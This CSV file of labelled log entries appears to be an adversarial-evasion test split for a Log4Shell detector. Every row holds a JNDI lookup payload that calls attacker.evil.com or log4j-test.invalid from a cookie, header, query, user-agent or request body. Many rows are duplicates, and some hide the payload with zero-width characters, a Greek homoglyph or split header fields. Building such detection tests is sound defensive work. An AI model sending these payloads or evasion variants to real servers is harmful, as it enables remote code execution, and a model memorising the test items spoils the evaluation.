id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-001660,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://attacker.evil.com/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://attacker.evil.com/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001661,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://attacker.evil.com/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://attacker.evil.com/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001662,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://attacker.evil.com/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://attacker.evil.com/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001663,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://attacker.evil.com/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://attacker.evil.com/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001664,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://attacker.evil.com/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://attacker.evil.com/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001665,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://attacker.evil.com/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://attacker.evil.com/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001666,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://attacker.evil.com/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://attacker.evil.com/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001667,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://attacker.evil.com/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://attacker.evil.com/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001668,2026-05-17,adversarial_evasion,GET /api/v2/users/profile Cookie: session=${jndi:ldap://attacker.evil.com/embedded} HTTP/1.1 Host: app.local Accept: text/html,get /api/v2/users/profile cookie: session=${jndi:ldap://attacker.evil.com/embedded} http/1.1 host: app.local accept: text/html,1,log4shell,context_embedded_payload,context,adversarial_evasion_test,critical
LS-001669,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001670,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001671,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001672,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001673,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001674,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001675,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001676,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001677,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001678,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001679,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001680,2026-05-17,adversarial_evasion,X-Custom: ${jndi X-Other: :ldap://attacker.evil.com/split-field},x-custom: ${jndi x-other: :ldap://attacker.evil.com/split-field},1,log4shell,field_split_payload,context,adversarial_evasion_test,critical
LS-001777,2026-05-17,adversarial_evasion,GET /?q=${jnd‍i:ldap://log4j-test.invalid/zw-d} HTTP/1.1,get /?q=${jnd‍i:ldap://log4j-test.invalid/zw-d} http/1.1,1,log4shell,zero_width_jndi,minimal_query,adversarial_evasion_test,critical
LS-001778,2026-05-17,adversarial_evasion,GET /api/check?debug=${jnd‍i:ldap://log4j-test.invalid/zw-d} HTTP/1.1 Host: app.local,get /api/check?debug=${jnd‍i:ldap://log4j-test.invalid/zw-d} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,adversarial_evasion_test,critical
LS-001779,2026-05-17,adversarial_evasion,Request from User-Agent: ${jnd‍i:ldap://log4j-test.invalid/zw-d} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jnd‍i:ldap://log4j-test.invalid/zw-d} | method: get | host: app.local | path: /,1,log4shell,zero_width_jndi,user_agent,adversarial_evasion_test,critical
LS-001780,2026-05-17,adversarial_evasion,Request from User-Agent: ${jnd‍i:ldap://log4j-test.invalid/zw-d},request from user-agent: ${jnd‍i:ldap://log4j-test.invalid/zw-d},1,log4shell,zero_width_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001781,2026-05-17,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${jnd‍i:ldap://log4j-test.invalid/zw-d},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /login | x-api-version: ${jnd‍i:ldap://log4j-test.invalid/zw-d},1,log4shell,zero_width_jndi,x_api_version,adversarial_evasion_test,critical
LS-001782,2026-05-17,adversarial_evasion,GET /search?q=${jnd‍i:ldap://log4j-test.invalid/zw-d} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${jnd‍i:ldap://log4j-test.invalid/zw-d} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,zero_width_jndi,path,adversarial_evasion_test,critical
LS-001783,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${jnd‍i:ldap://log4j-test.invalid/zw-d},post /search http/1.1 host: app.local body: query=${jnd‍i:ldap://log4j-test.invalid/zw-d},1,log4shell,zero_width_jndi,body,adversarial_evasion_test,critical
LS-001784,2026-05-17,adversarial_evasion,GET /?q=${jnd‍i:ldap://log4j-test.invalid/zw-d} HTTP/1.1,get /?q=${jnd‍i:ldap://log4j-test.invalid/zw-d} http/1.1,1,log4shell,zero_width_jndi,minimal_query,adversarial_evasion_test,critical
LS-001785,2026-05-17,adversarial_evasion,GET /api/check?debug=${jnd‍i:ldap://log4j-test.invalid/zw-d} HTTP/1.1 Host: app.local,get /api/check?debug=${jnd‍i:ldap://log4j-test.invalid/zw-d} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,adversarial_evasion_test,critical
LS-001786,2026-05-17,adversarial_evasion,Request from User-Agent: ${jnd‍i:ldap://log4j-test.invalid/zw-d} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jnd‍i:ldap://log4j-test.invalid/zw-d} | method: get | host: app.local | path: /login,1,log4shell,zero_width_jndi,user_agent,adversarial_evasion_test,critical
LS-001787,2026-05-17,adversarial_evasion,Request from User-Agent: ${jnd‍i:ldap://log4j-test.invalid/zw-d},request from user-agent: ${jnd‍i:ldap://log4j-test.invalid/zw-d},1,log4shell,zero_width_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001788,2026-05-17,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${jnd‍i:ldap://log4j-test.invalid/zw-d},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /metrics | x-api-version: ${jnd‍i:ldap://log4j-test.invalid/zw-d},1,log4shell,zero_width_jndi,x_api_version,adversarial_evasion_test,critical
LS-001789,2026-05-17,adversarial_evasion,GET /?q=${ϳndi:ldap://log4j-test.invalid/greek-j} HTTP/1.1,get /?q=${ϳndi:ldap://log4j-test.invalid/greek-j} http/1.1,1,log4shell,homoglyph_jndi,minimal_query,adversarial_evasion_test,critical
LS-001790,2026-05-17,adversarial_evasion,GET /api/check?debug=${ϳndi:ldap://log4j-test.invalid/greek-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ϳndi:ldap://log4j-test.invalid/greek-j} http/1.1 host: app.local,1,log4shell,homoglyph_jndi,uri_param,adversarial_evasion_test,critical
LS-001791,2026-05-17,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://log4j-test.invalid/greek-j} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${ϳndi:ldap://log4j-test.invalid/greek-j} | method: get | host: app.local | path: /login,1,log4shell,homoglyph_jndi,user_agent,adversarial_evasion_test,critical
LS-001792,2026-05-17,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://log4j-test.invalid/greek-j},request from user-agent: ${ϳndi:ldap://log4j-test.invalid/greek-j},1,log4shell,homoglyph_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001793,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${ϳndi:ldap://log4j-test.invalid/greek-j},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /metrics | x-api-version: ${ϳndi:ldap://log4j-test.invalid/greek-j},1,log4shell,homoglyph_jndi,x_api_version,adversarial_evasion_test,critical
LS-001794,2026-05-17,adversarial_evasion,GET /search?q=${ϳndi:ldap://log4j-test.invalid/greek-j} HTTP/1.1 Host: app.local User-Agent: Go-http-client/1.1,get /search?q=${ϳndi:ldap://log4j-test.invalid/greek-j} http/1.1 host: app.local user-agent: go-http-client/1.1,1,log4shell,homoglyph_jndi,path,adversarial_evasion_test,critical
LS-001795,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${ϳndi:ldap://log4j-test.invalid/greek-j},post /search http/1.1 host: app.local body: query=${ϳndi:ldap://log4j-test.invalid/greek-j},1,log4shell,homoglyph_jndi,body,adversarial_evasion_test,critical
LS-001796,2026-05-17,adversarial_evasion,GET /?q=${ϳndi:ldap://log4j-test.invalid/greek-j} HTTP/1.1,get /?q=${ϳndi:ldap://log4j-test.invalid/greek-j} http/1.1,1,log4shell,homoglyph_jndi,minimal_query,adversarial_evasion_test,critical
LS-001797,2026-05-17,adversarial_evasion,GET /api/check?debug=${ϳndi:ldap://log4j-test.invalid/greek-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ϳndi:ldap://log4j-test.invalid/greek-j} http/1.1 host: app.local,1,log4shell,homoglyph_jndi,uri_param,adversarial_evasion_test,critical
LS-001798,2026-05-17,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://log4j-test.invalid/greek-j} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${ϳndi:ldap://log4j-test.invalid/greek-j} | method: get | host: app.local | path: /search?q=boots,1,log4shell,homoglyph_jndi,user_agent,adversarial_evasion_test,critical
LS-001799,2026-05-17,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://log4j-test.invalid/greek-j},request from user-agent: ${ϳndi:ldap://log4j-test.invalid/greek-j},1,log4shell,homoglyph_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001800,2026-05-17,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /metrics | X-Api-Version: ${ϳndi:ldap://log4j-test.invalid/greek-j},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /metrics | x-api-version: ${ϳndi:ldap://log4j-test.invalid/greek-j},1,log4shell,homoglyph_jndi,x_api_version,adversarial_evasion_test,critical
LS-001801,2026-05-17,adversarial_evasion,GET /?q=${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw} HTTP/1.1,get /?q=${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw} http/1.1,1,log4shell,zero_width_jndi,minimal_query,adversarial_evasion_test,critical
LS-001802,2026-05-17,adversarial_evasion,GET /api/check?debug=${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw} HTTP/1.1 Host: app.local,get /api/check?debug=${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,adversarial_evasion_test,critical
LS-001803,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw} | method: get | host: app.local | path: /home,1,log4shell,zero_width_jndi,user_agent,adversarial_evasion_test,critical
LS-001804,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw},request from user-agent: ${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw},1,log4shell,zero_width_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001805,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /login | x-api-version: ${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw},1,log4shell,zero_width_jndi,x_api_version,adversarial_evasion_test,critical
LS-001806,2026-05-17,adversarial_evasion,GET /search?q=${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,zero_width_jndi,path,adversarial_evasion_test,critical
LS-001807,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw},post /search http/1.1 host: app.local body: query=${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw},1,log4shell,zero_width_jndi,body,adversarial_evasion_test,critical
LS-001808,2026-05-17,adversarial_evasion,GET /?q=${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw} HTTP/1.1,get /?q=${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw} http/1.1,1,log4shell,zero_width_jndi,minimal_query,adversarial_evasion_test,critical
LS-001809,2026-05-17,adversarial_evasion,GET /api/check?debug=${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw} HTTP/1.1 Host: app.local,get /api/check?debug=${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,adversarial_evasion_test,critical
LS-001810,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw} | method: get | host: app.local | path: /login,1,log4shell,zero_width_jndi,user_agent,adversarial_evasion_test,critical
LS-001811,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw},request from user-agent: ${j​n‌d‍i:ldap://log4j-test.invalid/multi-zw},1,log4shell,zero_width_jndi,user_agent_minimal,adversarial_evasion_test,critical
